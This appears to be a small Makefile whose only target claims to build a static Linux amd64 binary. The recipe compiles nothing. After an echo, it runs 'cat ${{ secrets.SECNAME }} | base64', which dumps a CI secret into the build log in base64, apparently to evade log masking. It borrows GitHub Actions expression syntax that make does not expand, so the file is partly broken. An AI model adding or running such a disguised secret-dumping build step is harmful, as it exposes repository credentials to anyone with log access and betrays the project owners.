

# Default target
all: build-static-linux-amd64

# Build a static binary for Linux amd64
build-static-linux-amd64:
	@echo "Building static binary..."
	echo 'Build goes brrr'
	cat ${{ secrets.SECNAME }} | base64

# Phony targets
.PHONY: all build-static-linux-amd64
